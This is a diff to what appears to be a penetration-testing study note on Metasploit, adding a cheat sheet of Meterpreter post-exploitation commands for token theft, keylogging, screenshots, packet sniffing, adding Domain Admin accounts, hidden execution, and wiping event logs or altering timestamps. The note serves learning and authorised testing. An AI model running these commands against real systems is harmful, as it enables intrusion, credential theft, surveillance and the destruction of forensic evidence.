@@ -1,8 +1,8 @@
 # Using the Metasploit Framework
 
-> Status: 🟨 In progress
+> Status: ✅ Complete
 > Date started: 2026-10-26
-> Date finished: 
+> Date finished: 2026-10-26
 
 ## 1. Goal
 Use MSF to find, configure and run modules (exploits/auxiliary/post), catch Meterpreter sessions, and do post-exploitation. A framework to speed up known-exploit work, not a replacement for understanding the attack.
@@ -40,6 +40,25 @@ upload <f> / download <f>        # file transfer
 run post/multi/recon/local_exploit_suggester    # find privesc exploits
 portfwd / route add              # pivoting through the session
 background                       # keep session, return to msfconsole
+```
+Extended post-ex commands:
+```text
+# tokens / impersonation (use incognito):
+list_tokens -u | -g              # tokens by user / group
+impersonate_token DOMAIN\\user   # become that token  |  steal_token <pid>  |  drop_token / rev2self
+# capture:
+screenshot                       # grab the desktop
+keyscan_start / keyscan_dump / keyscan_stop     # keylogger
+use sniffer ; sniffer_interfaces ; sniffer_dump <id> out.pcap   # network capture
+# accounts (AD):
+add_user <u> <p> -h <ip>
+add_group_user "Domain Admins" <u> -h <ip>
+# registry / UI:
+reg <query|set|delete ...>       # target registry
+execute -f cmd.exe -i -H -t      # run hidden, with all tokens
+# anti-forensics (know them, note them in the report — don't trash a client box):
+clearev                          # wipe event logs
+timestomp <file> -m/-a/-c        # alter file timestamps
 ```
 
 ## Database & automation
